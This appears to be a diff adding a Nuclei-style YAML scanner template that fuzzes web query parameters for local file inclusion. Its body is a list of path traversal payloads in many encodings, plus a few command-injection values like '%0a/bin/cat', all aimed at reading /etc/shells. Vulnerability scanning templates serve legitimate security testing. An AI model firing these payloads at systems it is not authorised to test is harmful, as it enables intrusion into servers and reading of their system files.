@@ -1,0 +1,79 @@
+id: lfi-fuzz
+
+info:
+  name: Local File Inclusion
+  author: 0x71rex
+  severity: high
+  tags: lfi,dast,linux
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}'
+
+    payloads:
+      nix_fuzz:
+        - '/etc/shells'
+        - '../../etc/shells'
+        - '../../../etc/shells'
+        - '/../../../../etc/shells'
+        - '../../../../../../../../../etc/shells'
+        - '../../../../../../../../etc/shells'
+        - '../../../../../../../etc/shells'
+        - '../../../../../../etc/shells'
+        - '../../../../../etc/shells'
+        - '../../../../etc/shells'
+        - '../../../etc/shells'
+        - '../../../etc/shells%00'
+        - '../../../../../../../../../../../../etc/shells%00'
+        - '../../../../../../../../../../../../etc/shells'
+        - '/../../../../../../../../../../etc/shells^^'
+        - '/../../../../../../../../../../etc/shells'
+        - '/./././././././././././etc/shells'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\shells'
+        - '..\..\..\..\..\..\..\..\..\..\etc\shells'
+        - '/..\../..\../..\../..\../..\../..\../etc/shells'
+        - '.\\./.\\./.\\./.\\./.\\./.\\./etc/shells'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\shells%00'
+        - '..\..\..\..\..\..\..\..\..\..\etc\shells%00'
+        - '%252e%252e%252fetc%252fshells'
+        - '%252e%252e%252fetc%252fshells%00'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells%00'
+        - '....//....//etc/shells'
+        - '..///////..////..//////etc/shells'
+        - '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/shells'
+        - '%0a/bin/cat%20/etc/shells'
+        - '%00/etc/shells%00'
+        - '%00../../../../../../etc/shells'
+        - '/../../../../../../../../../../../etc/shells%00.jpg'
+        - '/../../../../../../../../../../../etc/shells%00.html'
+        - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shells'
+        - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells'
+        - '\\&apos;/bin/cat%20/etc/shells\\&apos;'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{nix_fuzz}}'
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "# valid login shells"
+          - "/bin/sh"
+          - "/bin/ash"
+          - "/bin/bash"
+        condition: and
+        part: body
